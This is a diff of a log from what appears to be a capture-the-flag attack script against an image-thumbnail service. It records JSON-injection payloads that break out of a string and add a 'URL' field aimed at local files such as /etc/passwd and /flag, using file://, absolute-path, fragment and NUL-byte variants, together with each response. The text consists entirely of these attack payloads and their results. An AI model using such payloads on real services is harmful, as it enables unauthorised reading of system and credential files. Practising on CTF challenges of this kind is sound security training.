@@ -3,10 +3,26 @@
 STATUS 200 TYPE image/png BYTES 12297 PNG True
 SAVED thumb_control.png
 
-=== passwd TARGET '"},"URL":{"type":"string","value":"file:///etc/passwd'
+=== abs_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd'
 STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_passwd.png
+SAVED thumb_abs_passwd.png
 
-=== flag TARGET '"},"URL":{"type":"string","value":"file:///flag'
+=== abs_flag TARGET '"},"URL":{"type":"string","value":"/flag'
 STATUS 200 TYPE image/png BYTES 12297 PNG True
-SAVED thumb_flag.png
+SAVED thumb_abs_flag.png
+
+=== fragment_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd#x.txt'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_fragment_passwd.png
+
+=== fragment_flag TARGET '"},"URL":{"type":"string","value":"/flag#x.txt'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_fragment_flag.png
+
+=== nul_passwd TARGET '"},"URL":{"type":"string","value":"/etc/passwd\\u0000.txt'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_nul_passwd.png
+
+=== nul_flag TARGET '"},"URL":{"type":"string","value":"/flag\\u0000.txt'
+STATUS 200 TYPE image/png BYTES 12297 PNG True
+SAVED thumb_nul_flag.png
